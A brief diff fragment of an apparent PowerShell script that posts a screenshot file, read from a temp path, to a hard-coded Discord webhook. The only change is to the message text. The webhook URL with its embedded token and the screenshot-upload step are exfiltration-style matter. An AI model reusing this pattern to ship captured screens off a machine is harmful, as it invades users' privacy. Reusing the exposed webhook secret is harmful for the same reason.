@@ -44,7 +44,7 @@ $webhookUrl = 'https://discord.com/api/webhooks/1266038774689828966/1N__Dh0qQYEU
 
 # Prepare the file data for upload
 $fileData = @{
-    content = 'Here is a screenshot.'
+    content = 'WHO AM I???.'
     file = [System.IO.File]::ReadAllBytes($tempPath)
 }
 
